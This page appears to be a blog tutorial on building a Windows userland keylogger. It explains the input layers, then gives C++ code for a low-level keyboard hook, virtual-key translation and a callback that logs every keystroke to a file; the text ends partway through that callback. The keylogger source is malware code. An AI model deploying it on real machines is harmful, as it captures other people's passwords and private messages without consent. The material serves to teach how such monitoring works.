<!DOCTYPE html>
<html lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    
    <title>
      
        Writing a program that monitor keystrokes
      
    </title>

    
    <link rel="icon" type="image/png" href="../../favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/svg+xml" href="../../favicon.svg">
    <link rel="shortcut icon" href="../../favicon.ico">
    <link rel="apple-touch-icon" sizes="180x180" href="../../apple-touch-icon.png">
    <link rel="manifest" href="../../site.webmanifest">

    
    <meta property="og:type" content="website">
    <meta property="og:title"
          content="Writing a program that monitor keystrokes">
    <meta property="og:description"
          content="Exploring and building keyloggers to understand how keystroke monitoring is implemented.">
    <meta property="og:image"
          content="">
    <meta property="og:url" content="http://localhost:1313/research/keyloggers/">

    <meta name="twitter:card" content="summary_large_image">

    
    
    

  <link rel="stylesheet"
        href="../../css/style.min.3f73f2347843a7a89acfe85a677d60b2.css"
        integrity="md5-P3PyNHhDp6iaz&#43;haZ31gsg=="
        crossorigin>

  <link rel="stylesheet"
        href="../../css/chroma.min.a44a970f5e0d1481ed8d220169806a06.css"
        integrity="md5-pEqXD14NFIHtjSIBaYBqBg=="
        crossorigin>

  </head>

  <body>
    
    <header>
      <div class="banner">
        <pre class=ascii>
              .__  __   
   ___________|__|/  |_ 
  / ___\_  __ \  \   __\
 / /_/  >  | \/  ||  |  
 \___  /|__|  |__||__|  
/_____/                 
</pre>

      </div>

      
      <p class="quote">
        Obsess over every detail. Ask why it works. Ask why it isn’t built another way.
      </p>

      
      <nav id="menu">
        <a href="../../"
           class="">
          <span class="arrow">»</span> home
        </a>

        <a href="../../research"
           class="">
          <span class="arrow">»</span> research
        </a>

        <a href="../../tags"
           class="">
          <span class="arrow">»</span> tags
        </a>

        <a href="../../about"
           class="">
          <span class="arrow">»</span> about
        </a>
      </nav>
    </header>

    
    <main>
      
  

  <article>
    
      <h2>Writing a program that monitor keystrokes</h2>
    

    <h1 id="intro">Intro</h1>
<p>I’ve been messing around with malware development recently, and as part of my second warm-up project, I decided to write a simple keylogger. The goal here is to understand <strong>how userland keyloggers work on Windows</strong>, without getting overwhelmed by low-level internals.</p>
<h1 id="what-is-a-keylogger">What is a keylogger?</h1>
<p>A keylogger is a type of malware designed to <strong>record keystrokes</strong> in order to steal sensitive information such as passwords, credit card numbers, and private messages.</p>
<p>Keyloggers can exist at different levels:</p>
<ul>
<li>Hardware level (physical devices)</li>
<li>Driver / kernel level</li>
<li>Userland (user mode)</li>
</ul>
<p>In this article, we’ll focus only on <strong>userland keyloggers</strong>, specifically how they work and how they’re commonly implemented.</p>
<p>Most keyloggers store captured keystrokes in a file, but it’s also possible to <strong>exfiltrate them directly</strong> without ever touching disk. For simplicity, we’ll stick to basic file-based logging.</p>
<h1 id="how-does-a-userland-keylogger-work">How does a userland keylogger work?</h1>
<p>Before writing a keylogger, it helps to understand how keyboard input flows through Windows — at a high level.</p>
<p>Every key on a keyboard has a <strong>scan code</strong>, which is a hardware-level identifier sent when:</p>
<ul>
<li>the key is pressed</li>
<li>the key is released</li>
</ul>
<p>Windows processes keyboard input in layers:</p>
<h2 id="1-physical-layer">1. Physical layer</h2>
<p>The keyboard generates scan codes for key press and release events.</p>
<h2 id="2-driver-layer">2. Driver layer</h2>
<p>Keyboard drivers translate scan codes into <strong>virtual key codes (VK_*)</strong>.</p>
<h2 id="3-userland">3. Userland</h2>
<p>Applications receive these events as <strong>Windows messages</strong>, such as:</p>
<ul>
<li><code>WM_KEYDOWN</code></li>
<li><code>WM_KEYUP</code></li>
</ul>
<p>For example, a virtual key code might look like this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="k">case</span> <span class="nl">VK_NUMPAD0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="s">&#34;0&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="implementation">Implementation</h1>
<p>Let’s start with the implementation. Don’t worry—I’ll walk through it step by step. First, we’ll create a keyboard hook.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// 1. Create a keyboard hook
</span></span></span><span class="line"><span class="cl">  <span class="n">HHOOK</span> <span class="n">keyboardHook</span> <span class="o">=</span> <span class="n">SetWindowsHookEx</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">WH_KEYBOARD_LL</span><span class="p">,</span>       <span class="c1">// Type of hook procedure to be installed, I chose WH_KEYBOARD_LL to monitor low level keyboard inputs
</span></span></span><span class="line"><span class="cl">                            <span class="c1">// https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelkeyboardproc
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">LowLevelKeyboardProc</span><span class="p">,</span> <span class="c1">// 2. Pointer to the hook procedure ( Every keyboard events, windows will call LowLevelKeyboardProc() )
</span></span></span><span class="line"><span class="cl">                            <span class="c1">// 3. Note that the program itself doesn&#39;t call the function, Windows does whenever there&#39;s a keyboard event
</span></span></span><span class="line"><span class="cl">      <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">keyboardHook</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[ Failed to hook keyboard, exiting! ] </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// 4. Keep program alive and process windows internal messages
</span></span></span><span class="line"><span class="cl">  <span class="c1">// WH_KEYBOARD_LL require a GetMessage loop because their callbacks are queed as messages to the hooking thread&#39;s message queue
</span></span></span><span class="line"><span class="cl">  <span class="n">MSG</span> <span class="n">msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="n">GetMessage</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">TranslateMessage</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">msg</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">DispatchMessage</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">msg</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">  +------------------------------------------------------------------------------+
</span></span></span><span class="line"><span class="cl"><span class="cm">  | - SetWindowsHookEx     = Hey Windows, send me letters when someone types     |
</span></span></span><span class="line"><span class="cl"><span class="cm">  | - GetMessage loop      = You(Your program) checking your mailbox repeatedly  |
</span></span></span><span class="line"><span class="cl"><span class="cm">  | - LowLevelKeyboardProc = What you do when you receive a letter               |
</span></span></span><span class="line"><span class="cl"><span class="cm">  +------------------------------------------------------------------------------+
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// It&#39;ll only unhook the keyboard once the GetMessage() loop stops (most likely closed by the user)
</span></span></span><span class="line"><span class="cl">  <span class="n">UnhookWindowsHookEx</span> <span class="p">(</span> <span class="n">keyboardHook</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">Logger</span><span class="o">::</span><span class="n">outputFile</span><span class="p">.</span><span class="n">close</span> <span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[ Stopped capturing] </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="okay-bro-wait-what-do-you-even-mean-by-keyboard-hook-and-what-are-these-weird-functions">Okay bro wait, what do you even mean by keyboard hook and what are these weird functions?</h2>
<p>A hook is simply a mechanism that allows applications to intercept system-wide events, such as mouse input, keystrokes, or window messages, before they reach their target application.</p>
<p>You can think of it like a checkpoint: events pass through it, and you get a chance to inspect them. In this case, we’re intercepting keyboard events so we can log them.</p>
<p>The important thing to understand is:</p>
<ul>
<li>You don’t call the hook function</li>
<li>Windows calls it for you whenever a keyboard event occurs</li>
</ul>
<p>Make sure to read the comments in the code and refer to the MSDN documentation, it helps a lot here.</p>
<h1 id="handling-and-translating-virtual-keycodes">Handling and translating virtual keycodes</h1>
<p>Next, we need a way to translate virtual key codes into readable characters.</p>
<p>We’ll track modifier state first:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="k">namespace</span> <span class="n">KeyboardState</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">BOOL</span> <span class="n">shift</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">BOOL</span> <span class="n">capsLock</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we create a function that converts virtual key codes into characters:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">hookCode</span> <span class="p">(</span> <span class="n">DWORD</span> <span class="n">code</span><span class="p">,</span> <span class="n">BOOL</span> <span class="n">capsLock</span><span class="p">,</span> <span class="n">BOOL</span> <span class="n">shift</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">switch</span> <span class="p">(</span> <span class="n">code</span> <span class="p">)</span> <span class="c1">// SWITCH ON INT
</span></span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Char keys for ASCI
</span></span></span><span class="line"><span class="cl">  <span class="c1">// No VM Def in header
</span></span></span><span class="line"><span class="cl">  <span class="k">case</span> <span class="mh">0x41</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">capsLock</span> <span class="o">?</span> <span class="p">(</span> <span class="n">shift</span> <span class="o">?</span> <span class="s">&#34;a&#34;</span> <span class="o">:</span> <span class="s">&#34;A&#34;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">(</span> <span class="n">shift</span> <span class="o">?</span> <span class="s">&#34;A&#34;</span> <span class="o">:</span> <span class="s">&#34;a&#34;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">case</span> <span class="mh">0x42</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">capsLock</span> <span class="o">?</span> <span class="p">(</span> <span class="n">shift</span> <span class="o">?</span> <span class="s">&#34;b&#34;</span> <span class="o">:</span> <span class="s">&#34;B&#34;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">(</span> <span class="n">shift</span> <span class="o">?</span> <span class="s">&#34;B&#34;</span> <span class="o">:</span> <span class="s">&#34;b&#34;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">case</span> <span class="mh">0x43</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">capsLock</span> <span class="o">?</span> <span class="p">(</span> <span class="n">shift</span> <span class="o">?</span> <span class="s">&#34;c&#34;</span> <span class="o">:</span> <span class="s">&#34;C&#34;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">(</span> <span class="n">shift</span> <span class="o">?</span> <span class="s">&#34;C&#34;</span> <span class="o">:</span> <span class="s">&#34;c&#34;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="c1">// Keys
</span></span></span><span class="line"><span class="cl">  <span class="k">case</span> <span class="nl">VK_NUMLOCK</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="s">&#34; [NUM-LOCK] &#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">case</span> <span class="nl">VK_SCROLL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="s">&#34; [SCROLL-LOCK] &#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="s">&#34;[UNK-KEY]&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If you’re wondering what these <strong>0x41</strong>, <strong>0x42</strong>, etc. values are:
they’re virtual key codes. For example, according to the MSDN documentation, <strong>0x41</strong> corresponds to the <strong>A</strong> key.</p>
<p>We’re simply translating these numeric values into readable characters so the logs make sense.</p>
<h1 id="creating-the-hook-callback">Creating the hook callback</h1>
<p>Now let’s implement the function that Windows calls whenever a keyboard event occurs.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">LRESULT</span> <span class="n">CALLBACK</span> <span class="nf">LowLevelKeyboardProc</span> <span class="p">(</span> <span class="kt">int</span> <span class="n">code</span><span class="p">,</span> <span class="n">WPARAM</span> <span class="n">wParam</span><span class="p">,</span> <span class="n">LPARAM</span> <span class="n">lParam</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">    LRESULT CALLBACK LowLevelKeyboardProc
</span></span></span><span class="line"><span class="cl"><span class="cm">    (
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">    int code,        // Status: HC_ACTION, or negative
</span></span></span><span class="line"><span class="cl"><span class="cm">    WPARAM wParam,   // Event type: WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, etc.
</span></span></span><span class="line"><span class="cl"><span class="cm">    LPARAM lParam    // Pointer to KBDLLHOOKSTRUCT (detailed keyboard info)
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">    )
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">    https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelkeyboardproc
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">SHORT</span> <span class="n">getcapsLockStatus</span> <span class="o">=</span> <span class="n">GetKeyState</span> <span class="p">(</span> <span class="n">VK_CAPITAL</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span> <span class="n">getcapsLockStatus</span> <span class="o">&amp;</span> <span class="mh">0x0001</span> <span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Check if the low-order bit is set
</span></span></span><span class="line"><span class="cl">    <span class="n">KeyboardState</span><span class="o">::</span><span class="n">capsLock</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">KeyboardState</span><span class="o">::</span><span class="n">capsLock</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Create a pointer of KBDLLHOOKSTRUCT that contains keyboard event details (vkCode, scanCode, flags, etc.)
</span></span></span><span class="line"><span class="cl">  <span class="n">KBDLLHOOKSTRUCT</span> <span class="o">*</span><span class="n">keyboardData</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="n">KBDLLHOOKSTRUCT</span> <span class="o">*&gt;</span> <span class="p">(</span> <span class="n">lParam</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Is this a valid keyboard event that we can process? if yes then proceed
</span></span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">code</span> <span class="o">==</span> <span class="n">HC_ACTION</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Check if shift is pressed
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">     After creating a pointer to KBDLLHOOKSTRUCT we can now check virtual keycodes like this
</span></span></span><span class="line"><span class="cl"><span class="cm">     p-&gt;vkCode
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">    typedef struct tagKBDLLHOOKSTRUCT {
</span></span></span><span class="line"><span class="cl"><span class="cm">      DWORD     vkCode;
</span></span></span><span class="line"><span class="cl"><span class="cm">      DWORD     scanCode;
</span></span></span><span class="line"><span class="cl"><span class="cm">      DWORD     flags;
</span></span></span><span class="line"><span class="cl"><span class="cm">      DWORD     time;
</span></span></span><span class="line"><span class="cl"><span class="cm">      ULONG_PTR dwExtraInfo;
</span></span></span><span class="line"><span class="cl"><span class="cm">    } KBDLLHOOKSTRUCT, *LPKBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Checks if Shift is pressed1
</span></span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">keyboardData</span><span class="o">-&gt;</span><span class="n">vkCode</span> <span class="o">==</span> <span class="n">VK_LSHIFT</span> <span class="o">||</span> <span class="n">keyboardData</span><span class="o">-&gt;</span><span class="n">vkCode</span> <span class="o">==</span> <span class="n">VK_RSHIFT</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">wParam</span> <span class="o">==</span> <span class="n">WM_KEYDOWN</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">KeyboardState</span><span class="o">::</span><span class="n">shift</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">KeyboardState</span><span class="o">::</span><span class="n">shift</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Checks if a key is pressed down
</span></span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">wParam</span> <span class="o">==</span> <span class="n">WM_KEYDOWN</span> <span class="o">||</span> <span class="n">wParam</span> <span class="o">==</span> <span class="n">WM_SYSKEYDOWN</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">keyboardData</span><span class="o">-&gt;</span><span class="n">vkCode</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Clear the contents of the buffer
</span></span></span><span class="line"><span class="cl">        <span class="n">Logger</span><span class="o">::</span><span class="n">output</span><span class="p">.</span><span class="n">str</span> <span class="p">(</span> <span class="s">&#34;&#34;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Store the keylogs in buffer
</span></span></span><span class="line"><span class="cl">        <span class="n">Logger</span><span class="o">::</span><span class="n">output</span> <span class="o">&lt;&lt;</span> <span class="n">hookCode</span> <span class="p">(</span> <span class="n">keyboardData</span><span class="o">-&gt;</span><span class="n">vkCode</span><span class="p">,</span> <span class="n">KeyboardState</span><span class="o">::</span><span class="n">capsLock</span><span class="p">,</span> <span class="n">KeyboardState</span><span class="o">::</span><span class="n">shift</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Store the buffer data inside outputFile
</span></span></span><span class="line"><span class="cl">        <span class="n">Logger</span><span class="o">::</span><span class="n">outputFile</span> <span class="o">&lt;&lt;</span> <span class="n">Logger</span><span class="o">::</span><span class="n">output</span><span class="p">.</span><span class="n">str</span> <span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">Logger</span><span class="o">::</span><span class="n">outputFile</span><span class="p">.</span><span class="n">flush</span> <span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Print the contnets of outputFile
</span></span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">Logger</span><span class="o">::</span><span class="n">output</span><span class="p">.</span><span class="n">str</span> <span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
